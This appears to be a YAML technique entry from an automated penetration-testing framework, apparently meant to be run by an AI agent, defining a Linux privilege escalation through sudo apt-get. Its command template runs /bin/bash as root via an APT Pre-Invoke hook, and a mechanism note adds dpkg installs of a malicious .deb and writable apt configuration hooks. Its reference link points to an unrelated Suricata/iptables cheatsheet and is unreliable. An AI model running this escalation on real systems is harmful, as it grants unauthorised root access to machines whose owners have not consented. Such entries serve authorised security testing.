name: apt_get_privesc
category: privesc
description: apt-get/dpkg privilege escalation
preconditions:
- os==linux
parameters:
  target_ip: from_engagement.target_ip
command_template: sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
parser: generic_parser
expected_effects:
- apt_abused
- root_shell
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: 'If sudo allows apt-get: Pre-Invoke for shell. If sudo allows dpkg: dpkg
  -i malicious.deb with postinst script. If apt conf dir is writable: add Pre-Invoke
  hook.'
hacktricks_ref: generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/suricata-and-iptables-cheatsheet.md
